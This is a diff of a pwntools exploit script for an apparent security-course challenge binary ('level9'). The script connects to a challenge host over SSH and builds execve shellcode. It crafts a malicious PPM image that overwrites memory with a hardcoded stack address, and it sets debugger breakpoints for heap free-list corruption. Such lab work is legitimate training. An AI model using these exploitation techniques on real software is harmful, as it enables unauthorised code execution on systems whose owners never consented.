@@ -6,10 +6,10 @@ import ctypes
 
 
 
-exe = ELF("/var/challenge/level9/9")
+exe = ELF("9")
 
 context.binary = exe
-context.terminal = ['tmux', 'splitw', '-v']
+#context.terminal = ['tmux', 'splitw', '-v']
 
 shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
 shellcode_prev ="""
@@ -32,24 +32,26 @@ vlas = """             x/10gx $rax
 def conn():
     if args.SSH and not args.DEB:
         shell = ssh(host='appsec.vusec.net', user='rockygo2', port=41234, keyfile='~/.ssh/id_ed25519')
-        r = shell.process(['/home/rockygo2/challenge/level9/9'])
+        r = shell.process(['/var/challenge/level9/9'])
     if args.SSH and args.DEB:
         shell = ssh(host='appsec.vusec.net', user='rockygo2', port=41234, keyfile='~/.ssh/id_ed25519')
         # Start a process on the server
-        r = gdb.debug(['/home/rockygo2/challenge/level9/9'], exe='/home/rockygo2/challenge/level9/9',             
+        r = gdb.debug(['/var/challenge/level9/9'], exe='/var/challenge/level9/9',             
                                     ssh=shell,
                                     gdbscript='''
         c
         ''')
         
     if args.LOCAL:
-        r = process([exe.path])
         if args.DEB:
-            gdb.attach(r, gdbscript="""
-	    b *parse_image+426
-            b *free_list_remove
-            c
-        """)
+            # start the binary inside gdb (no race attaching)
+            r = gdb.debug(exe.path, gdbscript="""
+                b *parse_image+426
+                b *free_list_remove
+                c
+            """)
+        else:
+            r = process([exe.path])
 
 
     return r
@@ -92,7 +94,10 @@ def write_ppm(filename):
     width, height = a, b
     string_made += b"P6\n" + f"{width} {height}\n".encode() + b"255\n"
     string_made +=b"\x4a"*1+ b"\x00"*7
-    string_made += p64(0x7fffffffe478)
+    # 0x7fffffffe490
+    # 0x7fffffffe1a0
+    # 0x7fffffffed00
+    string_made += p64(0x7FFFFFFFECE8)
     return string_made
 
 def main():
